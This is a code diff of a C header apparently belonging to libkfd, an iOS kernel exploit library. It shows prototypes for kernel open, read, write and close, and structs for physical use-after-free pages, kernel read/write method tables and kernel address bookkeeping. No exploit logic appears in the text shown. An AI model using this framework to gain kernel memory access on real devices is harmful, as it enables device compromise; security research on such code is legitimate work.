@@ -36,6 +36,11 @@ enum kwrite_method {
     kwrite_IOSurface,
 };
 
+u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
+void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
+void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);
+void kclose(u64 kfd);
+
 /*
  * The private API of libkfd.
  */
@@ -49,58 +54,63 @@ struct info {
         vm_size_t size;
     } copy;
     struct {
-        int32_t pid;
-        uint64_t tid;
-        uint64_t vid;
-        uint64_t maxfilesperproc;
+        i32 pid;
+        u64 tid;
+        u64 vid;
+        bool ios;
+        char osversion[8];
+        u64 maxfilesperproc;
     } env;
     struct {
-        uint64_t kern_slide;
-        uint64_t current_map;
-        uint64_t current_pmap;
-        uint64_t current_proc;
-        uint64_t current_task;
-        uint64_t kernel_map;
-        uint64_t kernel_pmap;
-        uint64_t kernel_proc;
-        uint64_t kernel_task;
-    } kaddr;
+        u64 kernel_slide;
+        u64 gVirtBase;
+        u64 gPhysBase;
+        u64 gPhysSize;
+        struct {
+            u64 pa;
+            u64 va;
+        } ttbr[2];
+        struct ptov_table_entry {
+            u64 pa;
+            u64 va;
+            u64 len;
+        } ptov_table[8];
+
+        u64 current_map;
+        u64 current_pmap;
+        u64 current_proc;
+        u64 current_task;
+        u64 current_thread;
+        u64 current_uthread;
+        u64 kernel_map;
+        u64 kernel_pmap;
+        u64 kernel_proc;
+        u64 kernel_task;
+    } kernel;
 };
 
 struct perf {
-    uint64_t kernel_slide;
-    uint64_t gVirtBase;
-    uint64_t gPhysBase;
-    uint64_t gPhysSize;
+    u64 kernelcache_index;
     struct {
-        uint64_t pa;
-        uint64_t va;
-    } ttbr[2];
-    struct ptov_table_entry {
-        uint64_t pa;
-        uint64_t va;
-        uint64_t len;
-    } ptov_table[8];
-    struct {
-        uint64_t kaddr;
-        uint64_t paddr;
-        uint64_t uaddr;
-        uint64_t size;
+        u64 kaddr;
+        u64 paddr;
+        u64 uaddr;
+        u64 size;
     } shared_page;
     struct {
-        int32_t fd;
-        uint32_t si_rdev_buffer[2];
-        uint64_t si_rdev_kaddr;
+        i32 fd;
+        u32 si_rdev_buffer[2];
+        u64 si_rdev_kaddr;
     } dev;
-    void (*saved_kread)(struct kfd*, uint64_t, void*, uint64_t);
-    void (*saved_kwrite)(struct kfd*, void*, uint64_t, uint64_t);
+    void (*saved_kread)(struct kfd*, u64, void*, u64);
+    void (*saved_kwrite)(struct kfd*, void*, u64, u64);
 };
 
 struct puaf {
-    uint64_t number_of_puaf_pages;
-    uint64_t* puaf_pages_uaddr;
+    u64 number_of_puaf_pages;
+    u64* puaf_pages_uaddr;
     void* puaf_method_data;
-    uint64_t puaf_method_data_size;
+    u64 puaf_method_data_size;
     struct {
         void (*init)(struct kfd*);
         void (*run)(struct kfd*);
@@ -110,22 +120,22 @@ struct puaf {
 };
 
 struct krkw {
-    uint64_t krkw_maximum_id;
-    uint64_t krkw_allocated_id;
-    uint64_t krkw_searched_id;
-    uint64_t krkw_object_id;
-    uint64_t krkw_object_uaddr;
-    uint64_t krkw_object_size;
+    u64 krkw_maximum_id;
+    u64 krkw_allocated_id;
+    u64 krkw_searched_id;
+    u64 krkw_object_id;
+    u64 krkw_object_uaddr;
+    u64 krkw_object_size;
     void* krkw_method_data;
-    uint64_t krkw_method_data_size;
+    u64 krkw_method_data_size;
     struct {
         void (*init)(struct kfd*);
-        void (*allocate)(struct kfd*, uint64_t);
-        bool (*search)(struct kfd*, uint64_t);
-        void (*kread)(struct kfd*, uint64_t, void*, uint64_t);
-        void (*kwrite)(struct kfd*, void*, uint64_t, uint64_t);
+        void (*allocate)(struct kfd*, u64);
+        bool (*search)(struct kfd*, u64);
+        void (*kread)(struct kfd*, u64, void*, u64);
+        void (*kwrite)(struct kfd*, void*, u64, u64);
         void (*find_proc)(struct kfd*);
-        void (*deallocate)(struct kfd*, uint64_t);
+        void (*deallocate)(struct kfd*, u64);
         void (*free)(struct kfd*);
     } krkw_method_ops;
 };
@@ -138,16 +148,18 @@ struct kfd {
     struct krkw kwrite;
 };
 
+
 #include "libkfd/info.h"
 #include "libkfd/puaf.h"
 #include "libkfd/krkw.h"
 #include "libkfd/perf.h"
 #include "libkfd/krkw/kwrite/kwrite_IOSurface.h"
 
-struct kfd* kfd_init(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method, const char *IOSurface);
+extern bool running_IO;
+
+struct kfd* kfd_init(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method);
 void kfd_free(struct kfd* kfd);
-uint64_t kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method, const char *IOSurface);
-uint64_t io_kopen(uint64_t puaf_pages);
+uint64_t kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method);
 void kread(uint64_t kfd, uint64_t kaddr, void* uaddr, uint64_t size);
 void kwrite(uint64_t kfd, void* uaddr, uint64_t kaddr, uint64_t size);
 void kclose(uint64_t kfd);
